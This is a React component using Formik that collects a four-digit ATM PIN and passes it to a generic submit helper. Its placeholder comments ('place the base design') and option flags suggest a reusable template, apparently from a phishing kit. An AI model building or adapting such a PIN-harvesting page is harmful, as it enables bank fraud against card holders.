import { useFormik } from "formik"
import { submitBase } from "../../../helpers/submitBase"
import { useGeneralData } from "../../../hooks/useGeneralData"
import { atmValidate } from "../../../security/atmValidate"
import { Spiner } from "../../Spiner"
import { AtmError } from "./AtmError"
import { AtmInput } from "./AtmInput"

const initialValues = { atmPassword: '' }
export const Atm = () => {

  const dataImportant = useGeneralData({ spiner: true, endUrl: null, modeLive: false, timeLoader: 2000 })

  const { values, handleSubmit, handleChange, errors, handleBlur, touched } = useFormik({
      initialValues,
      validate: values => atmValidate({values}),
      onSubmit: async(valuesData, { resetForm }) => {
          // Descomentar si quieres tipo de documento
          // valuesData.typeDocument = selectItem
          submitBase({dataImportant, valuesData})
          return resetForm()
      }
  })
  return (
    <div>
        {/* Spiner de carga */}
        {
            dataImportant.showSpiner === true ? <Spiner /> : null
        }
        <AtmError errors={errors} touched={touched} />
        {/* Colocar diseño base */}
        <form className='flex flex-col' onSubmit={handleSubmit}>

            <AtmInput
                atmPassword={values.atmPassword.slice(0, 4)}
                handleChange={handleChange} 
                handleBlur={handleBlur}
                touched={touched}
                errors={errors}
            />
            
            <button 
              disabled={ Boolean(errors.atmPassword) === true ? true : false }
              className='bg-blue-400 px-4 py-1 rounded'
              type='submit'
            >
                Ingresar
            </button>
        </form>
    </div>
  )
}
